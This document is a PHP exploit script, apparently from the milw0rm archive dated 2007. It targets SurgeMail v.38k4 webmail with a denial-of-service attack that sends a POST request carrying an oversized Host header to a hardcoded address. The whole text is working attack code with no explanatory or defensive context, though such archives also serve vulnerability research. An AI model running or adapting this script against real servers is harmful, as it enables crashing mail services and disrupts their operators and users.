<?php
/*
  SurgeMail v.38k4 webmail Host header denial of service exploit
  tested against the windows version

  rgod
*/

dl("php_curl.so");
$url = "http://192.168.0.1";
$puf=str_repeat(0xff,0xfff);

        $header ="POST / HTTP/1.0\r\n";
        $header.="Host: $puf\r\n";
        $header.="Connection: Close\r\n\r\n";
      
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $header);

        $data = curl_exec($ch); if (curl_errno($ch)) {
           print curl_error($ch)."\n";
        } else {
           curl_close($ch);
        }

?>

# milw0rm.com [2007-12-18]
